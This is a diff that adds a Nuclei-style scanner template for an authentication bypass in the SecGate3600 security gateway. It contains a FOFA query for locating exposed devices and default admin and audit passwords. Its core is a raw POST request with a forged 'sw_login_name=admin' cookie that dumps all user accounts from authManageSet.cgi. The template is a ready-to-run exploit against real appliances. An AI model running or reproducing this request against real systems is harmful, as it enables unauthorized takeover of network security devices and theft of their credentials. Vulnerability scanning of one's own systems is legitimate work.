@@ -1,0 +1,29 @@
+id: wangshen-secgate3600-authmanagesetcgi-login-bypass
+
+info:
+  name: "网神 SecGate3600 authManageSet.cgi 身份验证绕过"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="sec_gate_image/login_02.gif"
+      SecGate3600是网神信息技术(北京)股份有限公司研发的安全网关系统，该产品在authManageSet.cgi接口的身份验证流程中存在逻辑缺陷。攻击者可利用此缺陷绕过预期认证机制，直接获取管理员凭据(admin/admin@123)及审计账户(audit/audit@123)，从而实现未授权系统控制及敏感信息访问。
+  tags: 网神SecGate3600
+
+http:
+- raw:
+  - |
+    POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: sw_login_name=admin
+
+    type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '管理员'
+    - '审计员'
